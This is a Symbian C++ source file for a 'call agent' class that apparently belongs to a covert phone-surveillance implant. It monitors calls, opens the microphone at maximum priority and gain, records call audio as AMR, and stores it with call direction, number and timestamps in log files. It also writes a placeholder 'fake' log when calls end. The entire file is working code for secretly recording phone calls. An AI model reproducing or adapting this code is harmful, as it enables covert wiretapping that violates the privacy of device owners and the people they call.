/*
 * AgentCall.cpp
 *
 *  Created on: 17/mag/2011
 *      Author: Giovanna
 */

#include "AgentCallLocal.h"
#include <HT\TimeUtils.h>

// Audio data buffer size for AMR encoding (20 ms per frame, a total of 5000 ms in 250 frames).
// http://wiki.forum.nokia.com/index.php/AMR_format
const TInt KFrameSizeAMR = 32; 
// Number of buffers used 
const TInt KStreamBufferCount = 2;

_LIT8(KFake,"\xff\xff\xff\xff");
_LIT(KLocal,"Local");

CAgentCallLocal::CAgentCallLocal() :
CAbstractAgent(EAgent_CallLocal),iInCall(EFalse),iRecState(ENotReady)
	{
	// No implementation required
	}

CAgentCallLocal::~CAgentCallLocal()
	{
	delete iCallMonitor;
	delete iTimer;
	
	if(iInputStream)
	    {
	    iInputStream->Stop();
	    delete iInputStream;
	    }

	if(iRecData)
		{
		delete iRecData;
		}
	 
	iStreamBufferArray.ResetAndDestroy();
	
	}

CAgentCallLocal* CAgentCallLocal::NewLC(const TDesC8& params)
	{
	CAgentCallLocal* self = new (ELeave) CAgentCallLocal();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentCallLocal* CAgentCallLocal::NewL(const TDesC8& params)
	{
	CAgentCallLocal* self = CAgentCallLocal::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentCallLocal::ConstructL(const TDesC8& params)
	{
		
	BaseConstructL(params);
	
	TUint8* ptr = (TUint8 *)iParams.Ptr();
	Mem::Copy( &iBuffSize, ptr, 4);
	ptr += 4;
	Mem::Copy(&iCompression,ptr,4 );
	
	
	iCallMonitor = CPhoneCallMonitor::NewL(*this);
	iTimer = CTimeOutTimer::NewL(*this);
		
	// Initial audio stream properties for input and output, 8KHz mono. 
	// These settings could also be set/changed using method SetAudioPropertiesL() of
	// the input and output streams.
	iStreamSettings.iChannels=TMdaAudioDataSettings::EChannelsMono;
	iStreamSettings.iSampleRate=TMdaAudioDataSettings::ESampleRate8000Hz;
	// set default encoding
	iDefaultEncoding = KMMFFourCCCodeAMR; 
	// construct stream
	// priorities will be ignored if the capability MultimediaDD isn't provided,
	// priority taken from mmfbase.h
    iInputStream = CMdaAudioInputStream::NewL(*this,EMdaPriorityMax,EMdaPriorityPreferenceTimeAndQuality);
		    			
    // stream buffers allocation
    TDes8* buffer;
    for (TInt idx=0; idx<KStreamBufferCount; idx++)
    	{
			buffer = new(ELeave) TBuf8<KFrameSizeAMR>;
			CleanupStack::PushL(buffer);        
			iStreamBufferArray.Append(buffer);        
			CleanupStack::Pop(buffer);        
    	}
	}

void CAgentCallLocal::StartAgentCmdL()
	{
	
	//we have to check if we are in call, maybe we've been called by an event call...
	TBuf<16>  telNumber;
	TInt direction;
	if(iCallMonitor->ActiveCall(direction,telNumber))
		{
		//immediately start recording:
		iInCall = ETrue;
		//set additional data
		TTime now;
		now.UniversalTime();
		TInt64 filetime = TimeUtils::GetFiletime(now);
		iVoiceAdditionalData.highStartTime = (filetime >> 32);
		iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
		//TODO: add line info
		if(direction == CTelephony::EMobileOriginated)
			{
			//outgoing
			//iVoiceAdditionalData.uCalleeIdLen = ...
			//iVoiceAdditionalData.uCallerIdLen = ...
			}
		else
			{
			//incoming
			//iVoiceAdditionalData.uCalleeIdLen = ...
			//iVoiceAdditionalData.uCallerIdLen = ...
			}
		}
	iCallMonitor->StartListeningForEvents();
	
	if(iInputStream)
	    {
		iInputStream->Stop();
		delete iInputStream;
		iInputStream = NULL;
		}
		
	// priorities will be ignored if the capability MultimediaDD isn't provided
	iInputStream = CMdaAudioInputStream::NewL(*this,EMdaPriorityMax,EMdaPriorityPreferenceTimeAndQuality);
		    
	// Open input stream.
	// Upon completion will receive callback in 
	// MMdaAudioInputStreamCallback::MaiscOpenComplete().
	iInputStream->Open(&iStreamSettings);
	    
	}

void CAgentCallLocal::StopAgentCmdL()
	{
	
	iTimer->Cancel();
	iCallMonitor->Cancel();
	
	if(iInputStream)
		{
		iInputStream->Stop();
		}
	
	}

void CAgentCallLocal::NotifyAgentCmdL(TUint32 aData)
	{
	
	}

/*
 * MMdaAudioInputStream callbacks (MMdaAudioInputStreamCallback)
 *
 * CAgentCall::MaiscOpenComplete(
 *     TInt aError)
 *
 * called upon completion of CMdaAudioInputStream::Open(),
 *  if the stream was opened succesfully (aError==KErrNone), it's ready for use.
 *  upon succesful open, the first audio data block will be read from the input
 *  stream.
 */
void CAgentCallLocal::MaiscOpenComplete(TInt aError)
    {
	if (aError==KErrNone) 
        {
		if(iRecData)
			{
			delete iRecData;
			iRecData = NULL;
			}
		iRecData = HBufC8::NewL(iBuffSize);
			
		// Set the data type (encoding)
        TRAPD(error, iInputStream->SetDataTypeL(iDefaultEncoding));

        // set stream input gain to maximum
        iInputStream->SetGain(iInputStream->MaxGain());
        iInputStream->SetPriority(EMdaPriorityMax,EMdaPriorityPreferenceTime);
        
        // we are ready for recording
        iRecState = EReady;
        
        // two buffers are used, they will be used in a internal FIFO queue
        if(iInCall)
        	{
        	//TODO: refine, start timer at less than a sec
        	iInputStream->ReadL(*iStreamBufferArray[0]);
        	iInputStream->ReadL(*iStreamBufferArray[1]);
        	}
        } 
	else
		{
		//TODO: retry if error?
		}
    }

/*
 * CAgentCall::MaiscBufferCopied(
 *      TInt aError, const TDesC8& aBuffer)
 *      
 *      called when a block of audio data has been read and is available at the 
 *      buffer reference *aBuffer.  calls to ReadL() will be issued until all blocks
 *      in the audio data buffer (iStreamBuffer) are filled.
 */

// NOTE: In 2nd Edition we MUST NOT call iInputStream->Stop() here, because
// this will cause a crash on 2nd Edition, FP1 devices.
// Since iInputStream->Stop() is not called, the callback method
// MaiscRecordComplete() will not be called either after exiting this method.
// In 3rd Edition, however, iInputStream->Stop() MUST be called in order to reach
// MaiscRecordComplete(), otherwise the stream will "hang".
// It appears that in 3.2 also calling Stop() here causes crash.
// Instead we let MMF to detect that buffer becomes full. It will
// then call MaiscRecordComplete() with status KErrOverflow.
// Input stream will be stopped there.

void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
    {
		
	if (aError==KErrNone && iInputStream) 
	    {
		if (&aBuffer==iStreamBufferArray[0])
		        iInputStream->ReadL(*iStreamBufferArray[0]);
		    else
		    	iInputStream->ReadL(*iStreamBufferArray[1]);
		if(aBuffer.Length())
			{
			iRecData->Des().Append(aBuffer);
			if((iRecData->Size()+aBuffer.Size())>iBuffSize) 
				{
				//this means that entire buffer has been filled
				TTime now;
				now.UniversalTime();
				TInt64 filetime = TimeUtils::GetFiletime(now);
				iVoiceAdditionalData.highStopTime = (filetime >> 32);
				iVoiceAdditionalData.lowStopTime = (filetime & 0xFFFFFFFF);
				//we have to write log
				if(!iBelowFreespaceQuota)
					{
					CLogFile* logFile = CLogFile::NewLC(iFs);
					logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
					logFile->AppendLogL(*iRecData);
					logFile->CloseLogL();
					CleanupStack::PopAndDestroy(logFile);
					}
				iVoiceAdditionalData.highStartTime = (filetime >> 32);
				iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
				// ...reset buffer 
				iRecData->Des().Zero();
				}
		    }
		}
	else if(aError == KErrAbort)
		{
		//this is called when a stop has been called
		if(aBuffer.Length())
			{
			iRecData->Des().Append(aBuffer);
						
			TTime now;
			now.UniversalTime();
			TInt64 filetime = TimeUtils::GetFiletime(now);
			iVoiceAdditionalData.highStopTime = (filetime >> 32);
			iVoiceAdditionalData.lowStopTime = (filetime & 0xFFFFFFFF);
					
			if(!iBelowFreespaceQuota)
				{
				CLogFile* logFile = CLogFile::NewLC(iFs);
				logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
				logFile->AppendLogL(*iRecData);
				logFile->CloseLogL();
				CleanupStack::PopAndDestroy(logFile);
				}
			iVoiceAdditionalData.highStartTime = (filetime >> 32);
			iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
						
			iRecData->Des().Zero();
			}
		}
    }


/*
 * 
 * CAgentCall::MaiscRecordComplete(
 *      TInt aError)
 *      
 *      called when input stream is closed by CMdaAudioInputStream::Stop()
 *      jo: well, that's not true, it's called also when an error condition arises....
 *      
 */
void CAgentCallLocal::MaiscRecordComplete(TInt aError)
    {
	
	if (aError == KErrNone) 
        {
		// normal stream closure after a stop and maiscbuffercopied
		// this seems never be the case (at least on E71).....
		}
    else if(aError == KErrCancel || aError == KErrAbort)
    	{
		// TODO: user selected stop
    	// but as above this is never the case (at least on E71)... 
    	// only MaiscBufferCopied with KErrAbort
    	}
    else if(aError == KErrDied)  //KErrDied = -13
    	{
    	//DevSound resource conflict, call is ongoing or native rec app has been opened
    	//we have to stop and restart everything
    	iInputStream->Stop();
    	}
    else //KErrUnderflow, KErrOverflow, KErrAccessDenied, 
        {
    	iInputStream->Stop();
        } 
    }

void CAgentCallLocal::WriteFakeLog()
	{
	TTime now;
	now.UniversalTime();
	TInt64 filetime = TimeUtils::GetFiletime(now);
	iVoiceAdditionalData.highStopTime = (filetime >> 32);
	iVoiceAdditionalData.lowStopTime = (filetime & 0xFFFFFFFF);
				
	CLogFile* logFile = CLogFile::NewLC(iFs);
	logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
	logFile->AppendLogL(KFake);
	logFile->CloseLogL();
	CleanupStack::PopAndDestroy(logFile);
	}

// aNumber.Length()==0  when private number calling
void CAgentCallLocal::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirection,const TDesC& aNumber)
	{
	if(!iInCall)  //coz this could be a second call: a conference or second call after holding the first one
		{
		iInCall = ETrue;
		//fill additional data
		TTime now;
		now.UniversalTime();
		TInt64 filetime = TimeUtils::GetFiletime(now);
		iVoiceAdditionalData.highStartTime = (filetime >> 32);
		iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
		//TODO: add line info
		if(aDirection == CTelephony::EMobileOriginated)
			{
			//outgoing
			iVoiceAdditionalData.uCalleeIdLen = aNumber.Size();
			iVoiceAdditionalData.uCallerIdLen = 0;
			iVoiceAdditionalData.uIngoing = 0;
			//see TSnapshotAdditionalData
			}
		else
			{
			//incoming
			iVoiceAdditionalData.uCalleeIdLen = 0;
			iVoiceAdditionalData.uCallerIdLen = aNumber.Size(); 
			iVoiceAdditionalData.uIngoing = 1;
			}
		//start recording:
		//TODO:check recorder ready
		if(iRecState == EReady)
			{
			iInputStream->ReadL(*iStreamBufferArray[0]);
			iInputStream->ReadL(*iStreamBufferArray[1]);
			}
		}
	}

void CAgentCallLocal::NotifyDisconnectedCallStatusL()
	{
	iInCall = EFalse;
	iInputStream->Stop();
	WriteFakeLog();
	}


void CAgentCallLocal::NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration, const TDesC& aNumber)
	{
	
	}

void CAgentCallLocal::TimerExpiredL(TAny* src)
	{
	}



